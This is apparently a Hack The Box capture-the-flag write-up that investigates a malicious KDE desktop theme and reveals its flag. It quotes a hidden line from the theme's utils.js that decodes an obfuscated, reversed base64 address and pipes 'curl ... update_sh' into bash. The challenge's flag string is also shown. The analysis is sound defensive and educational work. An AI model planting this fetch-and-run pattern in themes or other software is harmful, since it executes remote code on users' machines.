<img width="690" height="642" alt="image" src="https://github.com/user-attachments/assets/a348309a-f87c-4578-a9db-0998a1654456" />

### Initial Recon

We started by inspecting the file structure:

`tree ~/Desktop/htb/cp`

The directory included:

- A custom desktop theme (`Otto`)
- A plasmoid widget (`org.kde.netspeedWidget`)
- A zipped theme file (`Sp00ky Theme.zip`)

Given the context, we suspected the payload might be hidden in a script or config file.

<img width="1563" height="689" alt="image" src="https://github.com/user-attachments/assets/1746f46f-4506-433e-b1e8-dabb97e1bba1" />

<img width="1556" height="747" alt="image" src="https://github.com/user-attachments/assets/1b857833-4aae-4973-a502-94138fc4cba0" />

### Payload Discovery

To hunt for encoded strings or suspicious logic, we ran:

bash

`grep -rE '[A-Za-z0-9+/]{20,}={0,2}' .`

<img width="1627" height="697" alt="image" src="https://github.com/user-attachments/assets/795d6f6e-7750-4351-8d76-5e7e20b9de55" />

This revealed a juicy line in `utils.js`:

```jsx
"UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
```

The string was:

- **Base64-encoded**
- **Reversed** before decoding

We decoded it manually:

```jsx
echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev | base64 -d
```

<img width="1633" height="75" alt="image" src="https://github.com/user-attachments/assets/26f25ddc-37d1-4179-b4f6-5ecf8fb0a1d7" />

And boom — the flag dropped:

`HTB{pwn3d_by_th3m3s!?_1t_c4n_h4pp3n}`
